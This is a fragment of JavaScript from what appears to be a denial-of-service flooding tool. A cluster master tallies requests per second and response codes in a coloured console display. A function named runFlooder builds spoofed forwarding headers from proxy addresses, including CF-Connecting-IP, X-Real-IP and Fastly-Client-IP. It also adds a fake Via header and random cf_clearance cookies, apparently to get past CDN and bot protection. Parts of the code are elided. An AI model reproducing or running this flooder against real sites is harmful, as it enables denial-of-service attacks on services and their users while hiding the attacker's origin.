...
if (cluster.isMaster) {
    ...
    function renderStats() {
        ...
        console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
        console.log(`\x1b[32m📊 REAL-TIME STATISTICS\x1b[0m`);
        console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
        console.log(`\x1b[33m🔥 RPS:\x1b[32m ${stats.rps.toLocaleString()} req/s\x1b[0m`);
        console.log(`\x1b[33m📦 Total:\x1b[37m ${stats.total.toLocaleString()}\x1b[0m`);
        console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
        console.log(`\x1b[32m✅ 200 OK:\x1b[37m ${stats.codes[200].toLocaleString()}\x1b[0m`);
        console.log(`\x1b[33m🔍 404 Not Found:\x1b[37m ${stats.codes[404].toLocaleString()}\x1b[0m`);
        console.log(`\x1b[31m🚫 403 Forbidden:\x1b[37m ${stats.codes[403].toLocaleString()}\x1b[0m`);
        console.log(`\x1b[35m⏳ 429 Too Many:\x1b[37m ${stats.codes[429].toLocaleString()}\x1b[0m`);
        console.log(`\x1b[31m💀 500 Server Error:\x1b[37m ${stats.codes[500].toLocaleString()}\x1b[0m`);
        console.log(`\x1b[31m💀 502 Bad Gateway:\x1b[37m ${stats.codes[502].toLocaleString()}\x1b[0m`);
        console.log(`\x1b[90m❓ Other:\x1b[37m ${stats.codes.other.toLocaleString()}\x1b[0m`);
        console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    }
    ...
    setInterval(() => {
        ...
        if (diff >= 1) {
            stats.rps = Math.round(rpsCounter / diff);
            rpsCounter = 0;
            lastCheck = now;
            renderStats();
        }
    ...
    cluster.on('message', (worker, msg) => {
        if (msg.type === 'stats') {
            ...
            rpsCounter += msg.count || 0;
            
            const code = msg.statusCode;
            if (code === 200) stats.codes[200] += msg.count || 0;
            else if (code === 404) stats.codes[404] += msg.count || 0;
            else if (code === 403) stats.codes[403] += msg.count || 0;
            else if (code === 429) stats.codes[429] += msg.count || 0;
            else if (code === 500) stats.codes[500] += msg.count || 0;
            else if (code === 502) stats.codes[502] += msg.count || 0;
            else stats.codes.other += msg.count || 0;
        }
    });
...
function runFlooder() {
    ...
    const reflections = [
        ...
        { "Client-IP": parsedProxy[0] },
        { "X-Remote-IP": parsedProxy[0] },
        { "X-Remote-Addr": parsedProxy[0] },
        { "X-Real-IP": parsedProxy[0] },
        { "CF-Connecting-IP": parsedProxy[0] },
        { "X-Forwarded-Proto": "https" },
        { "X-Forwarded-Host": parsedTarget.host },
        { "Via": "1.1" + parsedProxy[0] + " (squid/3.5.27)" },
        { "NEL": val },
        { "Fastly-Client-IP": parsedProxy[0] },
        { "Fastly-Orig-Host": parsedTarget.host },
        { "X-Varnish-Cache": "MISS" },        
    ];
    
    const rateHeaders = [
        { "cookie": "cf_clearance=" + generateRandomString(16,64) },
